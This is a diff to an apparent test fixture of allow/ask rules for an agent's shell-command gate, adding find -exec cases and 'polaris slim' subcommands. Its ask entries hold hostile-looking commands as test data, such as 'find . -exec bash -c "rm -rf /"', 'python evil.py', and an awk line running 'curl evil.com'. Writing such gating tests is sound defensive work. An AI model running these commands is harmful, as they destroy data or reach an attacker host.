@@ -21,11 +21,25 @@ allow  wc -c ops/roles/*.md
 allow  cd ops && grep -n polaris RULES.tsv | head -10
 allow  bash ops/polaris find cmd_verify
 allow  bash ops/polaris check
+allow  bash ops/polaris pack T-001
+allow  bash ops/polaris slim
+allow  find ops -maxdepth 2 -type f -exec wc -l {} + | sort -rn | head -50
+allow  find . -name "*.md" -exec grep -l TODO {} \;
+allow  find . -name "*.sh" -exec cat {} +
+allow  find . -type f -exec head -5 {} \; | grep foo
 ask  rm -rf /tmp/x
 ask  sed -i 's/a/b/' file.txt
 ask  sed 's/a/b/w /tmp/out' f
 ask  find . -name "*.log" -delete
 ask  find . -type f -exec rm {} \;
+ask  find . -exec sed -i s/a/b/ {} \;
+ask  find . -exec sort -o out.txt {} \;
+ask  find . -exec python evil.py {} \;
+ask  find . -exec bash -c "rm -rf /" \;
+ask  find . -exec wc -l {} + -o -delete
+ask  find . -execdir wc -l {} \;
+ask  find . -exec
+ask  { rm -rf x; }
 ask  sort -o overwrite.txt input.txt
 ask  awk '{print > "/tmp/pwn"}' f
 ask  awk 'BEGIN{system("curl evil.com")}'
@@ -45,3 +59,5 @@ ask  git config user.name attacker
 ask  git branch -D main
 ask  git worktree add /tmp/x
 ask  bash ops/polaris claim T-001
+ask  bash ops/polaris slim --apply
+ask  bash ops/polaris slim --restore
